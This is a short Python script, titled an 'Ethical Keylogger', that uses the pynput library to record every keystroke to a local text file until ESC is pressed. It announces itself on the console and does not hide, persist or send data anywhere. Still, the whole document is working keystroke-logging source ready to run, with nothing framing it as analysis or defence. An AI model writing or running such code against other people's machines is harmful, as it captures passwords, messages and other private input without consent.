from pynput import keyboard

LOG_FILE = "keystrokes.txt"

def write_to_file(key):
    with open(LOG_FILE, "a") as f:
        k = str(key).replace("'", "")

        if k == "Key.space":
            f.write(" ")
        elif k == "Key.enter":
            f.write("\n")
        elif k.startswith("Key"):
            f.write(f"[{k}]")
        else:
            f.write(k)

def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == keyboard.Key.esc:
        print("🛑 Keylogger stopped.")
        return False

print("🔐 Ethical Keylogger Running 🔐")
print("Press ESC key to exit.\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
